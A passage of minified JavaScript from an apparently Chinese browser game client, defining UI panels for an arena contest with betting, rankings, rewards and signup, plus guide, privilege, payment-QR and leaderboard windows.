n=i(1),o=i(1096),s=i(5),a=i(0),r=i(74),l=i(1097),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ContestplayoffSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.eList.itemRenderer=o.ContestPlayoffItemRender,this.eList.dataProvider=this.listDP,this.eDescLab.textFlow=s.TextFlowMaker.generateTextFlow(a.GlobalConfig.ProtectArenaBase.contestDesc),this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateStatus,r.ContestCT.ins().postContestStatus),observe(this,this.updateList,r.ContestCT.ins().postContestInfo),observe(this,this.updateList,r.ContestCT.ins().postBetInfo),this.updateList(),this.updateStatus()},e.prototype.updateStatus=function(){var t=r.ContestCT.ins();this.eGroup2.visible=t.stageType>=r.Contest_Status.Prom2,this.eGroup1.visible=!this.eGroup2.visible},e.prototype.updateList=function(){this.updateMyRecord(),this.listDP.replaceAll(r.ContestCT.ins().contestInfos)},e.prototype.updateMyRecord=function(){},e.prototype.onClick=function(t){return t.target instanceof eui.Button&&t.target.parent instanceof o.ContestPlayoffItemRender?void win.open(l.ContestBetWin,t.target.parent.data):void 0},e.prototype.updateTime=function(){},__decorate([delayCall()],e.prototype,"updateList",null),e}(n.BaseView);e.ContestPlayoffPanel=h,window.ContestPlayoffPanel=h,__reflect(h.prototype,"ContestPlayoffPanel",[]),window.ContestPlayoffPanel=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestPlayoffItemRender=void 0;var n=i(3),o=i(74),s=i(298),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="ContestplayoffItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged(),this.mateList.itemRenderer=s.ContestMateItem,this.mateList.dataProvider=this.eArc=new eui.ArrayCollection},e.prototype.dataChanged=function(){if(this.skin&&this.data){this.updateBetInfo();var t=this.data;this.roleItem.data=t,this.eArc.replaceAll(t.mateArr);var e=t.buffIdxArr[0];if(e>-1){var i=o.ContestCT.ins().getBuffIdByIdx(e);this.imgItem.source=o.ContestCT.ins().getBuffMonIcon(i)}else this.imgItem.source="";this.mateList.dataProvider=new eui.ArrayCollection(t.mateArr),this.eScoreLab.text=o.ContestCT.getStageName(t.stage),0==t.record||2==t.record?(this.lose.visible=!1,this.vs.visible=!0):3==t.record?o.ContestCT.ins().stageType>=o.Contest_Status.Prom8?(this.lose.visible=!0,this.lose.source="contest_win",this.vs.visible=!1):(this.lose.visible=!1,this.vs.visible=!0):(this.lose.visible=!0,this.lose.source="contest_lose",this.vs.visible=!1),this.eBtn.eRp.visible=this.eBtn.visible=1!=t.record&&o.ContestCT.ins().betStage&&o.ContestCT.ins().curBetStage!=o.ContestCT.ins().stageType}},e.prototype.updateBetInfo=function(){if(this.skin&&this.data){var t=this.data,e=o.ContestCT.ins().getBetLog(t.actorId,t.stage);e?1==e.betType?(this.AtkBet.visible=!1,this.DefBet.visible=!0,this.txtDefBet.text=e.betNum+""):0==e.betType&&(this.AtkBet.visible=!0,this.DefBet.visible=!1,this.txtAtkBet.text=e.betNum+""):(this.AtkBet.visible=!1,this.DefBet.visible=!1)}},e}(n.BaseItemRender);e.ContestPlayoffItemRender=a,window.ContestPlayoffItemRender=a,__reflect(a.prototype,"ContestPlayoffItemRender",[]),window.ContestPlayoffItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestBetWin=void 0;var n=i(1),o=i(74),s=i(0),a=i(2),r=i(19),l=i(36),h=i(1098),u=i(5),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.money=0,e.betNum=0,e.betType=1,e._sn_="ContestbetSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.money=s.GlobalConfig.ProtectArenaBase.betCount,this.betNum=1,this.defGrp.visible=!0,this.atkScroll.visible=!1,this.betType=1,this.skillList.itemRenderer=h.ContestbetItem,this.skillList.dataProvider=this.eArc=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateBtn,o.ContestCT.ins().postContestStatus),observe(this,this.updateBtn,o.ContestCT.ins().postBetInfo),this.contestInfo=t[0]||null,this.update(),this.updateBtn()},e.prototype.updateBtn=function(){this.betBtn.enabled=o.ContestCT.ins().curBetStage!=o.ContestCT.ins().stageType,this.betBtn.label=this.betBtn.enabled?gettext("下注"):gettext("已下注")},e.prototype.update=function(){if(this.contestInfo){this.itemRole.data=this.contestInfo;var t=this.contestInfo.buffIdxArr[0];if(t>-1){var e=o.ContestCT.ins().getBuffIdByIdx(t);this.imgItem.source=o.ContestCT.ins().getBuffMonIcon(e),this.txtDesc.textFlow=u.TextFlowMaker.generateTextFlow1(o.ContestCT.ins().getBuffMonDesc(e))}else this.imgItem.source="",this.txtDesc.textFlow=[];this.updateBet(),this.updateList()}},e.prototype.updateList=function(){this.eArc.replaceAll(this.contestInfo.mateArr)},e.prototype.onClick=function(t){switch(t.target){case this.leftBtn:case this.rightBtn:this.betType=1==this.betType?0:1,this.defGrp.visible=!!this.betType,this.atkScroll.visible=!this.betType;break;case this.subBtn:this.betNum--,this.betNum=Math.max(1,this.betNum),this.updateBet();break;case this.addBtn:this.betNum++,this.betNum=Math.min(s.GlobalConfig.ProtectArenaBase.maxBett,this.betNum),this.updateBet();break;case this.minBtn:this.betNum=1,this.updateBet();break;case this.maxBtn:this.betNum=s.GlobalConfig.ProtectArenaBase.maxBett,this.updateBet();break;case this.betBtn:o.ContestCT.ins().betStage&&this.contestInfo.stage==o.ContestCT.ins().stageType?r.GlobalFun.checkCost(this.money,l.MoneyConst.yuanbao)&&o.ContestCT.ins().sendBet(this.contestInfo.actorId,this.money,this.betType):a.TipsCT.ins().showTips(gettext("下注已过期"))}},e.prototype.updateBet=function(){this.money=s.GlobalConfig.ProtectArenaBase.betCount*this.betNum,this.txtNum.text=this.betNum+"",this.txtCost.text=this.money+"",this.winTxt.text=gettext("胜利获得    守擂点{0}",this.money*s.GlobalConfig.ProtectArenaBase.betPrice),this.loseTxt.text=gettext("失败获得    守擂点{0}",this.money*s.GlobalConfig.ProtectArenaBase.betLosePrice)},e}(n.BaseView);e.ContestBetWin=p,window.ContestBetWin=p,__reflect(p.prototype,"ContestBetWin",[]),window.ContestBetWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestbetItem=void 0;var n=i(5),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="ContestbetItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data&&(this.info=this.data,this.roleItem.data=this.data,this.txtLevel.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("等级：{0}","|C:0x87ff7b&T:"+this.info.level)),this.txtPower.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("战力：{0}","|C:0xEC0202&T:"+this.info.power)))},e}(o.BaseItemRender);e.ContestbetItem=s,window.ContestbetItem=s,__reflect(s.prototype,"ContestbetItem",[]),window.ContestbetItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestRankPanel=void 0;var n=i(1),o=i(1100),s=i(74),a=i(44),r=i(7),l=i(5),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.topThreeId=[],e._sn_="ContestRankSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.ranks=[this.rank0,this.rank1,this.rank2],this.listDP=new eui.ArrayCollection,this.eList.itemRenderer=o.ContestRankItemRender,this.eList.dataProvider=this.listDP},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];s.ContestCT.ins().isOpeningView=!0,observe(this,this.update,s.ContestCT.ins().postQualityInfo),observe(this,this.updateStatus,s.ContestCT.ins().postContestStatus),observe(this,this.updateMyInfo,s.ContestCT.ins().postMyQualityInfo),observe(this,this.openOtherPlayerView,a.ReadPlayerCT.ins().postGetPlayerResult),this.update()},e.prototype.update=function(){var t=s.ContestCT.ins(),e=t.qualityInfos.concat();this.topThreeId=[];for(var i=0;i<this.ranks.length;i++)this.ranks[i].data=null,e&&e[i]&&(a.ReadPlayerCT.ins().sendFindPlayer(e[i].actorId,e[i].serverId),this.topThreeId.push(e[i].actorId));this.state.visible=null==e,this.listDP.source=e,this.updateStatus(),this.updateMyInfo();var n=s.ContestCT.ins().getPromCountAryNum();this.txtTips.textFlow=l.TextFlowMaker.generateTextFlow1(gettext("积分前{0}名晋级，18:15资格赛结束",n))},e.prototype.updateStatus=function(){var t=s.ContestCT.ins();this.eTime.visible=t.stageType==s.Contest_Status.Knockout,this.eTimeImg.source=t.stageType==s.Contest_Status.Knockout?"zgstimetxt_png":"zgsclosetxt_png",this.round.text=gettext("第{0}轮",s.ContestCT.ins().getQualityRound())},e.prototype.updateMyInfo=function(){var t=s.ContestCT.ins();this.eMyRank.text=t.myRank>0?t.myRank+"":gettext("未参赛"),this.eMymark.text=t.myScore+"",this.eMyrecord.text=s.ContestCT.getTotalRecord(t.myWin,t.myDraw,t.myLose)},e.prototype.updateTime=function(){if(s.ContestCT.ins().stageType==s.Contest_Status.Knockout&&this.skin){var t=Math.floor((s.ContestCT.ins().stageOverTime-r.GameServerCC.serverTime)/1e3);this.eTime.text=(t>0?t:0)+""}},e.prototype.openOtherPlayerView=function(t){if(t)for(var e=s.ContestCT.ins().qualityInfos,i=0;i<this.ranks.length;i++)if(this.topThreeId[i]==t.id&&this.ranks[i]){var n=t.roleData[0];if(n){this.ranks[i].visible=!0;var o={bolShowPt:!0,score:e[i]?e[i].score:0,name:t.name,level:t.level,job:n.job,outward:n.outward,titleID:n.title,wingID:n.wingID,demonCirID:n.demonCirID};this.ranks[i].data=o}else this.ranks[i].visible=!1}},e.prototype.removeDisplay=function(){s.ContestCT.ins().isOpeningView=!1},e}(n.BaseView);e.ContestRankPanel=h,window.ContestRankPanel=h,__reflect(h.prototype,"ContestRankPanel",[]),window.ContestRankPanel=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestRankItemRender=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="ContestRankItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data){var t=this.data;this.eRank.text=t.rank+"",this.eName.text=t.name,this.eServer.text=gettext("{0}区",t.serverName),this.eScore.text=t.score+"",this.eWin.text=t.winNum+"",this.eDraw.text=t.drawNum+"",this.eLose.text=t.loseNum+""}},e}(n.BaseItemRender);e.ContestRankItemRender=o,window.ContestRankItemRender=o,__reflect(o.prototype,"ContestRankItemRender",[]),window.ContestRankItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestRankRoleItem=void 0;var n=i(3),o=i(0),s=i(10),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="ContestRankRoleItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){var t;return this.skin&&this.data?(this.nomember.visible=!1,this.roleInfo=this.data,this.eNameLab.text=this.roleInfo.name,this.lb_lv.text=this.roleInfo.level.toString(),this.eIcon.source="yuanhead"+this.roleInfo.job+"1",this.bgkuang.source=this.roleInfo.outward?(null===(t=o.GlobalConfig.TitleConf[this.roleInfo.outward])||void 0===t?void 0:t.img)+"_png"||!1:"entity_bg",this.updateTitle(),void(this.data.bolShowPt?(this.grpPower.visible=!0,this.ePow.text=this.data.score):this.grpPower.visible=!1)):void(this.skin&&(this.nomember.visible=!0,this.grpPower.visible=!1))},e.prototype.updateTitle=function(){var t=parseInt(this.roleInfo.titleID);if(this.eTitleGrp.visible=!!t,this.effTopGrp.visible=!1,this.eTitleGrp.visible){var e=o.GlobalConfig.TitleConf[t];this.eTitle.text=(null===e||void 0===e?void 0:e.name)||"",this.eTitle.textColor=s.ItemUtil.getQualityColor((null===e||void 0===e?void 0:e.rare)||0),this.updateTitleEff(e)}},e.prototype.updateTitleEff=function(t){return(null===t||void 0===t?void 0:t.eff)?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+(null===t||void 0===t?void 0:t.eff),-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e}(n.BaseItemRender);e.ContestRankRoleItem=a,window.ContestRankRoleItem=a,__reflect(a.prototype,"ContestRankRoleItem",[]),window.ContestRankRoleItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestRewardPanel=void 0;var n=i(1),o=i(1103),s=i(0),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ContestRewardSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=o.ContestRewardItemRender;var t=[];for(var e in s.GlobalConfig.ProtectArenaAward){var i=s.GlobalConfig.ProtectArenaAward[e];for(var n in i)t.push(i[n])}var a={idx:0,type:0,award:s.GlobalConfig.ProtectArenaBase.joinReward,rewardpic:""};t.push(a),this.eList.dataProvider=new eui.ArrayCollection(t)},e}(n.BaseView);e.ContestRewardPanel=a,window.ContestRewardPanel=a,__reflect(a.prototype,"ContestRewardPanel",[]),window.ContestRewardPanel=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestRewardItemRender=void 0;var n=i(3),o=i(11),s=i(74),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.awardslist.itemRenderer=o.ItemBase,this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data){var t=this.data;0==t.idx?this.typeLabel.text=gettext("参与奖"):this.typeLabel.text=s.ContestCT.getStageName(10-t.idx)+(1==t.type?gettext("胜利"):gettext("失败")),this.awardslist.dataProvider=new eui.ArrayCollection(t.award),t.rewardpic&&""!=t.rewardpic?(this.eTitleBg.visible=!0,this.eTitleBg.source=t.rewardpic):this.eTitleBg.visible=!1}},e}(n.BaseItemRender);e.ContestRewardItemRender=a,window.ContestRewardItemRender=a,__reflect(a.prototype,"ContestRewardItemRender",[]),window.ContestRewardItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestSignPanel=void 0;var n=i(1),o=i(74),s=i(261),a=i(7),r=i(8),l=i(486),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ContestSignupSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,o.ContestCT.ins().postSignUp),observe(this,this.updateRed,s.ContestRedPoint.ins().postSignRed),this.update(),this.updateRed()},e.prototype.updateTime=function(){if(o.ContestCT.ins().stageType==o.Contest_Status.Sign&&this.skin){var t=(o.ContestCT.ins().stageOverTime-a.GameServerCC.serverTime)/1e3;0>t&&(t=0),this.eTimeLab.text=gettext("报名剩余时间：")+r.DateUtils.getFormatBySecond(t,r.DateUtils.TIME_FORMAT_1)}},e.prototype.update=function(){this.eBtn.enabled=!o.ContestCT.ins().isSignUp,this.eBtn.label=o.ContestCT.ins().isSignUp?gettext("已报名"):gettext("报名")},e.prototype.updateRed=function(){this.redPoint.visible=s.ContestRedPoint.ins().signRed},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:o.ContestCT.ins().sendSignUp(),win.open(l.ContestItemChoseWin)}},e}(n.BaseView);e.ContestSignPanel=h,window.ContestSignPanel=h,__reflect(h.prototype,"ContestSignPanel",[]),window.ContestSignPanel=h},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PlayWayDesTabItem=e.PlayWayDeslistItem=e.PlayWayDesPanel=void 0;var n=i(5),o=i(3),s=i(1),a=i(0),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.eTab.itemRenderer=h,this.eTab.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.eTab.selectedIndex=0,this.list.itemRenderer=l,this.updateList()},e.prototype.updateList=function(){var t;this.list.dataProvider=new eui.ArrayCollection([{str:(null===(t=a.GlobalConfig.HelpInfoConfig[this.eTab.selectedItem.HelpId])||void 0===t?void 0:t.text)||""}])},e.prototype.onItemClick=function(t){this.updateList()},e.openCheck=function(){return!window.platform.isshen()},e}(s.BaseView);e.PlayWayDesPanel=r,window.PlayWayDesPanel=r,__reflect(r.prototype,"PlayWayDesPanel",[]);var l=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.des.textFlow=n.TextFlowMaker.generateTextFlow(this.data.str)},e}(o.BaseItemRender);e.PlayWayDeslistItem=l,window.PlayWayDeslistItem=l,__reflect(l.prototype,"PlayWayDeslistItem",[]);var h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.labelDisplay&&(this.labelDisplay.text=this.data.name||"")},e}(o.BaseItemRender);e.PlayWayDesTabItem=h,window.PlayWayDesTabItem=h,__reflect(h.prototype,"PlayWayDesTabItem",[]),window.PlayWayDeslistItem=l,window.PlayWayDesTabItem=h,window.PlayWayDesPanel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PlayWayPanel=void 0;var n=i(1),o=i(17),s=i(0),a=i(54),r=i(12),l=i(35),h=i(488),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.sData=new eui.ArrayCollection,e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstPlayWay.itemRenderer=h.PlayWayItemRender},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=[],n=s.GlobalConfig.PlayWayConfig;if(n)for(var a in n){var l=n[a];if(!l.sysId||r.OpenSystem.ins().checkSysShow(l.sysId)){var h={desc:l.desc,title:l.title,target:l.target,times:l.times,sysId:null===l||void 0===l?void 0:l.sysId};i.push(h)}}observe(this,this.updateRp,o.RedPointBaseSys.ins().RpChange),this.sData.replaceAll(i)},e.prototype.tabRp=function(){return l.TaskCT.ins().taskRp.v||l.TaskCT.ins().dayTaskRed.v||l.TaskCT.ins().weekTaskRed.v||a.Fb2CT.ins().fb2Rp.v},e.prototype.updateRp=function(){this.sData.refresh()},e.prototype.GuideWaKuang=function(){var t=this.lstPlayWay.getElementAt(3);return t&&t.btnTarget?t.btnTarget:null},e.prototype.GuideTT=function(){var t=this.lstPlayWay.getElementAt(4);return t&&t.btnTarget?t.btnTarget:null},e}(n.BaseView);e.PlayWayPanel=u,window.PlayWayPanel=u,__reflect(u.prototype,"PlayWayPanel",[]),window.PlayWayPanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PrivilegeTipWin=void 0;var n=i(8),o=i(5),s=i(1),a=i(0),r=i(31),l=i(25),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="PrivilegeTipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.state=this.$param[0],0==this.state?(this.gwargod.visible=!1,this.grecovery.visible=!0):(this.gwargod.visible=!0,this.grecovery.visible=!1);var t=a.GlobalConfig.PrivilegeData;this.lbrecovery1.textFlow=o.TextFlowMaker.generateTextFlow(t.Recovery1),this.lbrecovery2.textFlow=o.TextFlowMaker.generateTextFlow(t.Recovery2),this.lbrecover3.textFlow=o.TextFlowMaker.generateTextFlow(t.Recovery3),this.lbrecovery4.textFlow=o.TextFlowMaker.generateTextFlow(t.Recovery4),this.lbwargod1.textFlow=o.TextFlowMaker.generateTextFlow(t.Wargod1),this.lbwargod2.textFlow=o.TextFlowMaker.generateTextFlow(t.Wargod2),this.lbwargod3.textFlow=o.TextFlowMaker.generateTextFlow(t.Wargod3),this.lbwargod4.textFlow=o.TextFlowMaker.generateTextFlow(t.Wargod4),this.lbwargod5.textFlow=o.TextFlowMaker.generateTextFlow(t.Wargod5)},e.prototype.addDisplay=function(){this.addTouchEndEvent(this.recClose,this.onClick),this.addTouchEndEvent(this.btnActive,this.onClick),observe(this,this.updateRecycle,l.Recharge.ins().postRecycle),observe(this,this.updateGodOfWar,l.Recharge.ins().postGodWar);var t=a.GlobalConfig.PrivilegeData.privilegeRecycle.dayyuanbao||0;this.costCm.setShow(r.ITEM_ICON.yuanbao,""+t),this.updateRecycle(),this.updateGodOfWar()},e.prototype.updateRecycle=function(){if(0==this.state)if(0==l.Recharge.ins().recycleTime)this.btnActive.label=gettext("前往激活"),this.timeValue="",this.costCm.visible=!1,this.btnActive.touchEnabled=!0;else{if(0==l.Recharge.ins().recycleIsGet?(this.btnActive.label=gettext("领取"),this.btnActive.touchEnabled=!0):(this.btnActive.label=gettext("已领取"),this.btnActive.touchEnabled=!1),l.Recharge.ins().recycleTime<n.DateUtils.SECOND_PER_DAY){this.lastTime=l.Recharge.ins().recycleTime;var t=n.DateUtils.getFormatBySecond(this.lastTime,n.DateUtils.TIME_FORMAT_11);this.timeValue=t,Timer.start(1e3,-1,this.timeFun,this)}else{var t=n.DateUtils.getFormatBySecond(l.Recharge.ins().recycleTime,n.DateUtils.TIME_FORMAT_5,1);this.timeValue=t}this.costCm.visible=!0}},e.prototype.updateGodOfWar=function(){if(1==this.state)if(0==l.Recharge.ins().godOfWarTime)this.btnActive.label=gettext("前往激活"),this.timeValue="",this.costCm.visible=!1,this.btnActive.touchEnabled=!0;else{if(0==l.Recharge.ins().godOfWarIsGet?(this.btnActive.label=gettext("领取"),this.btnActive.touchEnabled=!0):(this.btnActive.label=gettext("已领取"),this.btnActive.touchEnabled=!1),l.Recharge.ins().godOfWarTime<n.DateUtils.SECOND_PER_DAY){this.lastTime=l.Recharge.ins().godOfWarTime;var t=n.DateUtils.getFormatBySecond(this.lastTime,n.DateUtils.TIME_FORMAT_11);this.timeValue=t,Timer.start(1e3,-1,this.timeFun,this)}else{var t=n.DateUtils.getFormatBySecond(l.Recharge.ins().godOfWarTime,n.DateUtils.TIME_FORMAT_5,1);this.timeValue=t}this.costCm.visible=!0}},e.prototype.timeFun=function(){this.lastTime--;var t=n.DateUtils.getFormatBySecond(this.lastTime,n.DateUtils.TIME_FORMAT_11);this.timeValue=t,this.lastTime<=0&&Timer.stop(this.timeFun,this)},e.prototype.onClick=function(t){switch(t.currentTarget){case this.btnActive:0==this.state?0==l.Recharge.ins().recycleTime?(win.close(this),win.open("RechargeTQTip","privilegeRecycle")):0==l.Recharge.ins().recycleIsGet&&l.Recharge.ins().sendRecycle():0==l.Recharge.ins().godOfWarTime?(win.close(this),win.open("RechargeTQTip","privilegeGodOfWar")):0==l.Recharge.ins().godOfWarIsGet&&l.Recharge.ins().sendGodOfWar();break;case this.recClose:win.close(this)}},e.prototype.removeDisplay=function(){Timer.stop(this.timeFun,this)},e}(s.BaseView);e.PrivilegeTipWin=h,window.PrivilegeTipWin=h,__reflect(h.prototype,"PrivilegeTipWin",[]),window.PrivilegeTipWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QiyuWin=void 0;var n=i(1),o=i(35),s=i(489),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="QiyuWinSkin",e.listArr=new eui.ArrayCollection,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.dataProvider=this.listArr,this.list.itemRenderer=s.QiyuItem},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateData,o.TaskCT.ins().doQiyuInfo),observe(this,this.updateData,o.TaskCT.ins().doQiyuInfoDelete),this.updateData()},e.prototype.updateData=function(){var t=o.TaskCT.ins().qiyuData;this.listArr.source=t
},e.prototype.onClick=function(t){},e}(n.BaseView);e.QiyuWin=a,window.QiyuWin=a,__reflect(a.prototype,"QiyuWin",[]),window.QiyuWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QrcodePayWin=void 0;var n=i(1),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="QrcodePaySkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.price&&(this.code.source=t[0],this.price.textFlow=tHtml(t[1]),this.addTouchEndEvent(this.eCloseBtn,this.closeClick))},e.prototype.closeClick=function(t){win.close(e)},e}(n.BaseView);e.QrcodePayWin=o,window.QrcodePayWin=o,__reflect(o.prototype,"QrcodePayWin",[]),window.QrcodePayWin=o},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankingWin=void 0;var n=i(1),o=i(491),s=i(131),a=i(2),r=i(88),l=i(71),h=i(44),u=i(1120),p=i(12),d=i(15),c=i(93),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RankSkin",e.toplist=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.praiseBtn.touchEnabled=!0,this.praiseBtn.icon="xphb_json.phb_2",this.list.itemRenderer=o.RankItemRenderer,this.tab.itemRenderer=u.RankTabItemRenderer,c.Friends.ins().sendBlackList()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.praiseBtn,this.onClick),this.addTouchEvent(this.list,this.onClick),this.addChangeEvent(this.tab,this.onClick),this.addTouchEvent(this.grp1,this.onClick),this.addTouchEvent(this.grp2,this.onClick),this.addTouchEvent(this.grp3,this.onClick),this.setOpenType(void 0==t[0]?-1:t[0]),observe(this,this.updateList,r.Rank.ins().postRankingData),observe(this,this.openOtherPlayerView,h.ReadPlayerCT.ins().postPlayerResult),observe(this,this.updatePraise,r.Rank.ins().postPraiseData),observe(this,this.updateTab,r.Rank.ins().postAllPraiseData),r.Rank.ins().sendGetAllPraiseData(),this.grp1.visible=this.grp2.visible=this.grp3.visible=!1},e.prototype.updateList=function(t){if(t.type==this._type){this.selfPos.text=0<t.selfPos&&t.selfPos<=1e3?t.selfPos+"":"未上榜";var e=t.getDataList(),i=[];this.toplist=[];for(var n=0;n<e.length;n++)e[n].pos<4?this.update123(e[n]):i.push(e[n]);this.list.dataProvider=new eui.ArrayCollection(i),this.state.visible=e&&!e.length}},e.prototype.update123=function(t){var e=t.pos;this["grp"+e].visible=!0,this["jobbg"+e].source="Role_zy"+t.job2,this["name"+e].text=t.player||"",this["jobimg"+e].source="yuanhead"+t.job2+"1";var i="";switch(t.RankType){case l.RankDataType.TYPE_POWER:i=""+t.power;break;case l.RankDataType.TYPE_LEVEL:i=gettext("{0}转{1}级",t.zhuan,t.level)}this["lab"+e].text=i||"",this.toplist.push(t)},e.prototype.setOpenType=function(t){for(var e=this.tab.dataProvider,i=0,n=0;n<e.length;n++){var o=e.getItemAt(n);if(o.type==t){i=n;break}}this.setOpenIndex(i)},e.prototype.setOpenIndex=function(t){this.tab.selectedIndex=t;var e=this.tab.selectedItem;this._type=e.type,r.Rank.ins().curType=this._type,o.RankItemRenderer.dataFormat=e,this.eTips.text=e.desc||e.name.slice(0,2),this.selfPos.text=null,this.list.dataProvider=null,this._type==l.RankDataType.TYPE_LADDER?s.Ladder.ins().sendGetRankInfo():r.Rank.ins().sendGetRankingData(this._type),r.Rank.ins().sendGetPraiseData(this._type),this.state.visible=!0},e.prototype.onClick=function(t){switch(t.currentTarget){case this.list:this.list.selectedItem&&(this._openOtherWin=!0,h.ReadPlayerCT.ins().sendFindPlayer(this.list.selectedItem[l.RankDataType.DATA_ID]));break;case this.tab:this.setOpenIndex(this.tab.selectedIndex);break;case this.grp1:case this.grp2:case this.grp3:this.toplist[Number(t.target.name)]&&(this._openOtherWin=!0,h.ReadPlayerCT.ins().sendFindPlayer(this.toplist[Number(t.target.name)][l.RankDataType.DATA_ID]))}},e.prototype.openOtherPlayerView=function(t){this._openOtherWin&&(this._openOtherWin=!1,win.open("RRoleWin",t))},e.prototype.updatePraise=function(t){r.Rank.ins().rankModel[t].praise.id>0,this.updateTab()},e.prototype.updateTab=function(){var t=this.tab.selectedIndex;this.tab.dataProvider.refresh(),this.tab.selectedIndex=t},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=p.OpenSystem.ins().checkSysOpen(d.SystemType.RANK);return i||a.TipsCT.ins().showTips(p.OpenSystem.ins().getNoOpenTips(d.SystemType.RANK)),i},e}(n.BaseView);e.RankingWin=f,window.RankingWin=f,__reflect(f.prototype,"RankingWin",[]),window.RankingWin=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankTabItemRenderer=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="BtnTab3Skin",e}return __extends(e,t),e.prototype.dataChanged=function(){this.labelDisplay.text=this.data.name},e}(n.BaseItemRender);e.RankTabItemRenderer=o,window.RankTabItemRenderer=o,__reflect(o.prototype,"RankTabItemRenderer",[]),window.RankTabItemRenderer=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AutoPrivilegeWin=void 0;var 